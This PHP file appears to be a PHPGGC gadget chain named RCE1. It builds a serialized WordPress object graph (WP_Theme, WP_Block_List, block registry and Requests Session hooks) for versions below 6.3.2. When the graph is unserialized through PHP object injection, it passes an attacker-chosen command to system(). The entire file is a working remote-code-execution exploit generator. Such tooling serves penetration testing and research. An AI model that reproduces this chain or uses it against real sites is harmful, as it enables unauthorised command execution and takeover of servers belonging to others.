<?php

namespace GadgetChain\WordPress;

class RCE1 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '< 6.3.2';
    public static $vector = '__toString';
    public static $author = 'pandhacker';
    public static $information = 'Executes given command through system()';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        $blocks = array(
            'Name' => array(
                'blockName' => 'Parent Theme'
            )
        );

        $hooks_recurse_once = new \WpOrg\Requests\Hooks(
            array(
                'http://localhost/Name' => array(
                    array('system')
                )
            )
        );

        $hooks = new \WpOrg\Requests\Hooks(
            array(
                'requests.before_request' => array(
                    array(
                        array(
                            $hooks_recurse_once,
                            'dispatch'
                        )
                    )
                )
            )
        );

        $parent = new \WpOrg\Requests\Session('http://localhost/', array($command), array('hooks' => $hooks));
        $registered_block_types = new \WP_Theme(null, $parent);
        $registry = new \WP_Block_Type_Registry($registered_block_types);
        $headers = new \WP_Block_List($blocks, $registry);

        return new \WP_Theme($headers);
    }
}